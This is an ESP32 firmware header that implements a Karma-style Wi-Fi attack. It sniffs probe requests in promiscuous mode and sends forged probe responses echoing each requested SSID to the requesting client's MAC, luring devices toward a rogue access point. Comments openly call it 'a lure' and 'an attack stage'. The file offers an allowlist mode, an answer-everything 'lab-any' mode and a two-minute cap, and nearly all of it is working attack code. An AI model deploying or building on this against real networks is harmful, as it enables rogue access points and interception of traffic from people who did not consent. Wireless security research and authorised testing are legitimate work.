// probe_reply.h — template-based probe response (Karma).
//
// ── WHY THIS EXISTS, AND WHY THE CAPTURE PATH CANNOT DO IT ──────────────────
// The capture callback copies raw bytes to PSRAM and never inspects a single
// frame — that is the right design for a tape recorder, and the wrong design
// for answering a probe. A probe response must reach the air within a few ms
// of the request; a USB serial round-trip at 115200 baud is ~50–100 ms, and a
// client that doesn't hear back fast enough moves on.
//
// So the firmware MUST inspect the frame and transmit the response. The only
// question is how much of the frame it builds itself.
//
// ── THE TEMPLATE SPLIT ──────────────────────────────────────────────────────
// The phone builds the entire probe-response frame as one blob of hex, with a
// sentinel SSID of a known fixed length, and sends it with PROBE_REPLY_START.
// The firmware stores it and hot-swaps the SSID bytes at the declared offset
// before transmitting. The frame builder stays on the phone where tshark
// verifies it; the firmware knows nothing about RSN IEs, capability bits, or
// rates — all of that is baked into the template by the phone.
//
// The consequence: THE FIRMWARE CANNOT VALIDATE THE TEMPLATE. It checks
// length and sanity, and that is all. If the template carries a broken RSN IE,
// the phone asked for it, and tshark would have caught it on the bench.
//
// ── THE PROMISCUOUS CALLBACK ────────────────────────────────────────────────
// Runs in the Wi-Fi driver task at a priority above the main loop. It fires
// for every management frame and does only the minimum — no allocation, no
// logging, no JSON, no transmission. It recognises a probe request, extracts
// the SSID and source MAC, and pushes them into a small ring buffer. The main
// loop pops one entry per pass and transmits the response.
//
// ── THE RING BUFFER ─────────────────────────────────────────────────────────
// Small and fixed-size. If it fills, newer entries overwrite the oldest — a
// full buffer on a busy channel should lose probes rather than block the
// driver. The main loop drains it one entry per pass, same pacing as tx_poll(),
// so the protocol port keeps answering throughout.

#pragma once

#include <Arduino.h>
#include <WiFi.h>
#include <esp_wifi.h>
#include <ArduinoJson.h>

// ── constants ───────────────────────────────────────────────────────────────

#define PR_MAX_TEMPLATE     1500      // same ceiling as TX_MAX_FRAME
#define PR_SSID_MAX         32        // 802.11 SSID max
#define PR_ALLOWLIST_MAX    64        // matches attack.js buildBeaconPool cap
#define PR_RING_SIZE        8         // lose probes rather than block the driver
#define PR_TOTAL_MS_MAX     120000    // 2-minute hard cap; a lure is not a service

// ── ring buffer entry ───────────────────────────────────────────────────────

#pragma pack(push, 1)
struct PrEntry {
    uint8_t sta[6];
    char    ssid[PR_SSID_MAX + 1];
    int8_t  rssi;
};
#pragma pack(pop)

// ── state ───────────────────────────────────────────────────────────────────

static uint8_t  g_pr_template[PR_MAX_TEMPLATE];
static size_t   g_pr_template_len = 0;
static uint16_t g_pr_kssid_offset = 0;    // byte offset into template where the
                                          //   SSID tag payload starts
static uint8_t  g_pr_kssid_maxlen = 32;   // max SSID bytes the sentinel is sized for

static char  g_pr_allowlist[PR_ALLOWLIST_MAX][PR_SSID_MAX + 1];
static uint8_t g_pr_allowlist_count = 0;

static PrEntry g_pr_ring[PR_RING_SIZE];
static volatile uint8_t g_pr_ring_head  = 0;
static volatile uint8_t g_pr_ring_count = 0;

static uint8_t  g_pr_ch       = 1;
static uint8_t  g_pr_mode     = 0;       // 0=allowlist, 1=lab-any
static bool     g_pr_on       = false;
static uint32_t g_pr_start_ms = 0;
static uint32_t g_pr_matched  = 0;
static uint32_t g_pr_sent     = 0;
static uint32_t g_pr_fail     = 0;
static bool     g_pr_ever     = false;
static uint32_t g_pr_lifetime = 0;

// ── helpers ─────────────────────────────────────────────────────────────────

static inline bool probe_reply_running() { return g_pr_on; }

// Exact string match, never a substring. The callback writes
// null-terminated names into the ring buffer, so strcmp is the right check.
static bool pr_allowlist_has(const char* ssid) {
    if (!ssid || !*ssid) return false;
    for (uint8_t i = 0; i < g_pr_allowlist_count; i++) {
        if (strcmp(g_pr_allowlist[i], ssid) == 0) return true;
    }
    return false;
}

static void pr_ring_push(const PrEntry* e) {
    uint8_t idx = (g_pr_ring_head + g_pr_ring_count) % PR_RING_SIZE;
    memcpy(&g_pr_ring[idx], e, sizeof(PrEntry));
    if (g_pr_ring_count < PR_RING_SIZE) {
        g_pr_ring_count++;
    } else {
        // Full ring: advance the head to drop the oldest, keeping the newest.
        g_pr_ring_head = (g_pr_ring_head + 1) % PR_RING_SIZE;
    }
}

static bool pr_ring_pop(PrEntry* out) {
    if (g_pr_ring_count == 0) return false;
    memcpy(out, &g_pr_ring[g_pr_ring_head], sizeof(PrEntry));
    g_pr_ring_head = (g_pr_ring_head + 1) % PR_RING_SIZE;
    g_pr_ring_count--;
    return true;
}

// ── the promiscuous callback ────────────────────────────────────────────────
// Runs in the Wi-Fi driver task. No heap, no logging, no JSON, no TX — just
// recognise a probe request and push a ring-buffer entry.

static void pr_rx_cb(void* buf, wifi_promiscuous_pkt_type_t type) {
    if (!g_pr_on) return;
    if (type != WIFI_PKT_MGMT) return;

    const wifi_promiscuous_pkt_t* pkt = (const wifi_promiscuous_pkt_t*)buf;
    uint32_t on_air = pkt->rx_ctrl.sig_len;
    // The frame needs room for a 24-byte 802.11 header plus at least one tagged
    // parameter. sig_len counts the 4-byte FCS.
    if (on_air < 28 + 4) return;

    const uint8_t* frame = (const uint8_t*)pkt->payload;

    // Probe Request: Frame Control subtype 0100 = 0x40 in the first byte.
    if ((frame[0] & 0xfc) != 0x40) return;

    // Source address is addr2 (bytes 10–15), destination is addr1 (bytes 4–9).
    // A group-addressed probe (I/G bit set in addr1) is a broadcast probe —
    // every AP should answer, and answering from our MAC is the whole point.
    // No need to filter it.

    // Walk tagged parameters starting at offset 24. Each is [type:1][len:1][val:len].
    uint32_t pos = 24;
    uint32_t end = on_air - 4;   // FCS is not in the payload
    const char* ssid = nullptr;
    uint8_t ssid_len = 0;

    while (pos + 2 <= end) {
        uint8_t tag  = frame[pos];
        uint8_t tlen = frame[pos + 1];
        if (pos + 2 + tlen > end) break;   // truncated: skip the whole frame
        if (tag == 0x00) {                  // SSID tag
            ssid     = (const char*)(frame + pos + 2);
            ssid_len = tlen;
            break;                           // first SSID tag wins
        }
        pos += 2 + tlen;
    }

    // A probe with no SSID tag, or a zero-length SSID (wildcard broadcast
    // probe) is not answered. Wildcard probes are noise — every device on
    // every scan sends them, and answering them would drown the channel.
    if (!ssid || ssid_len == 0) return;
    if (ssid_len > PR_SSID_MAX) return;

    // Push into the ring buffer. An overrun silently drops the oldest.
    PrEntry e;
    memcpy(e.sta, frame + 10, 6);           // addr2 = source MAC
    memcpy(e.ssid, ssid, ssid_len);
    e.ssid[ssid_len] = '\0';
    e.rssi = (int8_t)pkt->rx_ctrl.rssi;
    pr_ring_push(&e);
}

// ── parse hex into the template buffer ──────────────────────────────────────

static bool pr_parse_hex(const char* hex, size_t* out_len) {
    if (!hex) return false;
    size_t n = strlen(hex);
    if (n < 48) return false;               // 24-byte header minimum
    if (n > (size_t)PR_MAX_TEMPLATE * 2) return false;
    if (n % 2) return false;

    size_t bytes = n / 2;
    for (size_t i = 0; i < bytes; i++) {
        int hi = hex[2 * i], lo = hex[2 * i + 1];
        auto nib = [](int c) -> int {
            if (c >= '0' && c <= '9') return c - '0';
            if (c >= 'a' && c <= 'f') return c - 'a' + 10;
            if (c >= 'A' && c <= 'F') return c - 'A' + 10;
            return -1;
        };
        int h = nib(hi), l = nib(lo);
        if (h < 0 || l < 0) return false;
        g_pr_template[i] = (uint8_t)((h << 4) | l);
    }
    *out_len = bytes;
    return true;
}

// ── arm the radio ───────────────────────────────────────────────────────────

static bool pr_arm(uint8_t channel) {
    if (WiFi.getMode() != WIFI_STA) {
        WiFi.mode(WIFI_STA);
        WiFi.disconnect();
        delay(60);
    }
    if (esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE) != ESP_OK) return false;
    esp_wifi_set_ps(WIFI_PS_NONE);
    return true;
}

// ── start / stop ────────────────────────────────────────────────────────────

static bool probe_reply_start(const char* template_hex, uint8_t channel,
                              uint16_t kssid_offset, uint8_t kssid_maxlen,
                              const char** allowlist, uint8_t allowlist_count,
                              const char* mode, const char** why) {
    if (g_pr_on) { *why = "probe reply already running"; return false; }
    if (channel < 1 || channel > 14) { *why = "channel must be 1..14"; return false; }

    size_t tlen = 0;
    if (!pr_parse_hex(template_hex, &tlen)) {
        *why = "template_hex must be an even-length valid frame";
        return false;
    }
    if (kssid_maxlen == 0 || kssid_maxlen > PR_SSID_MAX) {
        *why = "kssid_maxlen must be 1..32";
        return false;
    }
    if ((size_t)kssid_offset + (size_t)kssid_maxlen > tlen) {
        *why = "kssid_offset + kssid_maxlen exceeds the template length";
        return false;
    }
    // The two bytes at kssid_offset-2 should be [tag=0x00][len=kssid_maxlen],
    // but the firmware does not enforce this — the phone built the template
    // and tshark verified it. The firmware's job is to trust the offset and
    // swap the bytes.

    g_pr_template_len  = tlen;
    g_pr_kssid_offset  = kssid_offset;
    g_pr_kssid_maxlen  = kssid_maxlen;

    // Copy the allowlist. For lab-any mode the list is ignored.
    g_pr_allowlist_count = 0;
    if (allowlist && allowlist_count > 0) {
        uint8_t n = allowlist_count;
        if (n > PR_ALLOWLIST_MAX) n = PR_ALLOWLIST_MAX;
        for (uint8_t i = 0; i < n; i++) {
            if (!allowlist[i]) continue;
            size_t len = strlen(allowlist[i]);
            if (len == 0 || len > PR_SSID_MAX) continue;
            memcpy(g_pr_allowlist[g_pr_allowlist_count], allowlist[i], len + 1);
            g_pr_allowlist_count++;
        }
    }

    // Mode: exact string comparison — anything that is not literally "lab-any"
    // is treated as allowlist, so a typo closes the gate rather than opening it.
    g_pr_mode = (mode && strcmp(mode, "lab-any") == 0) ? 1 : 0;

    if (!pr_arm(channel)) { *why = "could not arm the radio"; return false; }

    // Install the promiscuous callback BEFORE arming the sniffer — the flag
    // is already true, so the first interrupt does not discard it.
    g_pr_ch       = channel;
    g_pr_ring_head  = 0;
    g_pr_ring_count = 0;
    g_pr_matched  = 0;
    g_pr_sent     = 0;
    g_pr_fail     = 0;

    wifi_promiscuous_filter_t filter;
    filter.filter_mask = WIFI_PROMIS_FILTER_MASK_MGMT;   // management frames only
    esp_wifi_set_promiscuous_filter(&filter);
    esp_wifi_set_promiscuous_rx_cb(&pr_rx_cb);

    g_pr_on = true;
    if (esp_wifi_set_promiscuous(true) != ESP_OK) {
        g_pr_on = false;
        esp_wifi_set_promiscuous_rx_cb(nullptr);
        *why = "could not enable promiscuous mode";
        return false;
    }

    g_pr_start_ms = millis();
    return true;
}

static void probe_reply_stop() {
    if (!g_pr_on) return;
    esp_wifi_set_promiscuous(false);
    esp_wifi_set_promiscuous_rx_cb(nullptr);
    g_pr_on = false;
}

// ── poll: one entry per pass ────────────────────────────────────────────────
// Returns true on the pass the mode stops (user command), same edge-triggered
// contract as tx_poll() and cap_poll(). The caller uses that edge to emit the
// completion event.

static bool probe_reply_poll() {
    if (!g_pr_on) return false;

    // Hard cap: a lure is an attack stage, not a persistent service.
    uint32_t elapsed = millis() - g_pr_start_ms;
    if (elapsed >= PR_TOTAL_MS_MAX) {
        probe_reply_stop();
        return true;
    }

    PrEntry e;
    if (!pr_ring_pop(&e)) return false;   // nothing waiting

    // Match against the allowlist. In lab-any mode, everything passes.
    if (g_pr_mode == 0 && !pr_allowlist_has(e.ssid)) {
        // Didn't match the allowlist, but keep the matched counter honest for
        // STATUS — it counts probes checked, not probes answered.
        g_pr_matched++;
        return false;
    }
    g_pr_matched++;

    // Hot-swap the SSID into the template. Copy the whole template to a stack
    // buffer, swap the SSID bytes, and transmit the copy — never transmit from
    // the stored template, because a malformed SSID (too long for the sentinel)
    // would leave it corrupted for the next probe.
    uint8_t out[PR_MAX_TEMPLATE];
    memcpy(out, g_pr_template, g_pr_template_len);

    size_t ssid_len = strlen(e.ssid);
    if (ssid_len > g_pr_kssid_maxlen) ssid_len = g_pr_kssid_maxlen;
    memcpy(out + g_pr_kssid_offset, e.ssid, ssid_len);
    // Zero-fill the remainder — the tag length byte is at kssid_offset-2 and
    // still declares kssid_maxlen, so the extra bytes are padding. The phone
    // built the tag that way, and the firmware does not shorten it.
    if (ssid_len < g_pr_kssid_maxlen) {
        memset(out + g_pr_kssid_offset + ssid_len, 0,
               g_pr_kssid_maxlen - ssid_len);
    }

    // The response goes to the station that asked — addr1 in the probe request
    // was either broadcast or our BSSID; addr1 in the response must be the
    // station's MAC. But the template's DA was already set to the sentinel
    // station. The phone builds a template with DA = FF:FF:FF:FF:FF:FF (or the
    // sentinel) and the firmware replaces it? No — the template's DA is set to
    // the sentinel station the same way the SSID is. The phone sets DA to a
    // known sentinel MAC (e.g., 00:00:00:00:00:00), and tells us the offset.
    // But that's wasteful — we'd need TWO sentinel offsets (DA + SSID).
    //
    // Simpler: the probe response DA is always the probe request SA. We know
    // SA from the ring buffer entry. So we write e.sta into the template's
    // addr1 (bytes 4–9 of the 802.11 header) directly — that is always at a
    // fixed offset and does not require a sentinel.
    memcpy(out + 4, e.sta, 6);

    // en_sys_seq = true: let the driver own the sequence number.
    esp_err_t rc = esp_wifi_80211_tx(WIFI_IF_STA, out, (int)g_pr_template_len, true);
    if (rc == ESP_OK) {
        g_pr_sent++;
        g_pr_lifetime++;
        g_pr_ever = true;
    } else {
        g_pr_fail++;
        if (g_pr_fail >= 16 && g_pr_sent == 0) {
            // A driver that refuses every frame is a different problem.
            probe_reply_stop();
            return true;
        }
    }

    return false;
}

// ── stats for STATUS / PROBE_REPLY_STATUS ───────────────────────────────────

static void probe_reply_stats(JsonDocument& d) {
    d["running"]     = g_pr_on;
    d["channel"]     = g_pr_ch;
    d["matched"]     = g_pr_matched;
    d["sent"]        = g_pr_sent;
    d["failed"]      = g_pr_fail;
    d["mode"]        = g_pr_mode ? "lab-any" : "allowlist";
    d["allowlist_n"] = g_pr_allowlist_count;
    d["ever"]        = g_pr_ever;
    d["lifetime"]    = g_pr_lifetime;
    d["elapsed_ms"]  = g_pr_on ? (uint32_t)(millis() - g_pr_start_ms) : 0;
}